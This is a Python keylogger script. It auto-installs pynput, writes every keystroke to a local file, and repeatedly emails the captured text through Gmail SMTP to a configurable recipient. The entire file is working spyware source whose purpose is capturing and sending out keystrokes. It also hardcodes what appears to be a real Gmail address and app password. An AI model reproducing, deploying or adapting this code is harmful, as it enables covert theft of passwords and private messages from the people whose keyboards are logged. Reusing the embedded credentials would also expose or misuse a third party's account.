import sys
import subprocess

# implement pip as a subprocess:

subprocess.run([sys.executable, '-m', 'pip', 'install','pynput'])
subprocess.run([sys.executable, '-m', 'pip', 'install','secure-smtplib'])


from pynput import keyboard
import smtplib,ssl

sender_mail = "ibrahimsaleem930@gmail.com"  
code = "joqtqydvjgdqlkev"    
receiver_mail = "your_email" #ENTER YOUR GMAIL ID HERE
            
port = 587
message = """From: ibrahimsaleem930@gmail.com
To: your_email                                        
Subject: KeyLogs
Text: Keylogs 
"""

def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()

def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)

    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

def on_key_release(Key):
    #This stops the Listener/Keylogger.
    #You can use any key you like by replacing "esc" with the key of your choice
    if(Key == keyboard.Key.enter):
        return False

while True:
    with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
        listener.join()

    with open("keylogger.txt",'r') as f:
        temp = f.read()
        message = message + str(temp)
        f.close()

    context = ssl.create_default_context()
    server = smtplib.SMTP('smtp.gmail.com', port)
    server.starttls()
    server.login(sender_mail,code)
    server.sendmail(sender_mail,receiver_mail,message)
    print("Email Sent")
    
